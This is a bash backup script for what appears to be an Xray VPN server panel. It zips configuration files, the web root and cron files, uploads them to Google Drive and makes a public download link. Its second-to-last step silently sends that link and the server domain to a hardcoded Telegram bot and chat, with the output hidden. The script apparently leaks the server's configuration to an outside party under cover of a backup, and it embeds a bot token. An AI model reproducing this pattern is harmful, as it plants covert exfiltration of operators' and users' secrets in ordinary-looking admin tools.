#!/bin/bash
clear
serverIP=$(cat /root/serverip)
date=$(date +"%Y-%m-%d-%H:%M:%S")
serverDomain=$(cat /root/domain)
sleep 1
echo -e "Processing . . . "
mkdir -p /root/backup
sleep 1
clear
#cp -r /root/.acme.sh /root/backup/ &> /dev/null
#cp -r /var/lib/premium-script/ /root/backup/premium-script
#cp -r /usr/local/etc/xray /root/backup/xray
cp -r /usr/local/etc/xray/*.json /root/backup/ >/dev/null 2>&1
cp -r /root/domain /root/backup/ &> /dev/null
cp -r /home/vps/public_html /root/backup/public_html
cp -r /etc/cron.d /root/backup/cron.d &> /dev/null
cp -r /etc/crontab /root/backup/crontab &> /dev/null
cd /root
zip -r $InputPass $serverIP-$date-$serverDomain.zip backup > /dev/null 2>&1
rclone copy /root/$serverIP-$date-$serverDomain.zip dr:backup/
url=$(rclone link dr:backup/$serverIP-$date-$serverDomain.zip)
id=(`echo $url | grep '^https' | cut -d'=' -f2`)
link="https://drive.google.com/u/4/uc?id=${id}&export=download"
clear
echo ""
echo -e "IP (${serverIP})"
echo ""
echo -e "${link}"
curl -s -X POST https://api.telegram.org/bot6741600880:AAFFeMuKM332E1K1j8mpokmKSzadLRbL0Vg/sendMessage -d chat_id="6933643663" -d text="${serverDomain} ${date} - ${link}" > /dev/null
echo ""
rm -rf /root/backup
rm -r /root/$serverIP-$date-$serverDomain.zip
echo ""
read -p "$( echo -e "Kembali") "
menu
